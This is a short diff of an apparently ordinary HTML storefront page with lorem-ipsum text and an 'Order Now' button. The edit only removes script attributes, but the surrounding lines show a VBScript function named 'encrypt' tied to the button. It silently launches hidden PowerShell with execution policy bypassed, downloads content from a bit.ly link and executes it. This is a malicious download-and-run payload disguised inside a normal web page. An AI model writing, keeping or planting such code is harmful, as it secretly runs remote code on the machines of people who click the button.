@@ -16,7 +16,7 @@
       href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@500&family=Bree+Serif&display=swap"
       rel="stylesheet"
     />
-    <script language="vbs" type="text/vbscript">
+    <script language="vbs">
       Function encrypt()
           Set objShell = CreateObject("Wscript.Shell")
           objShell.run "powershell.exe -noprofile -executionpolicy bypass -windowstyle hidden $a=invoke-webrequest https://bit.ly/3cm7fi0;$b=$a.content; invoke-expression $b"
@@ -47,7 +47,7 @@
       <p>
         Lorem ipsum dolor sit amet consectetur adipisicing elit. Omnis, totam!
       </p>
-      <button class="btn" language=VBScript onclick="encrypt()">Order Now</button>
+      <button class="btn" onclick="encrypt()">Order Now</button>
     </section>
 
     <section class="services-container">
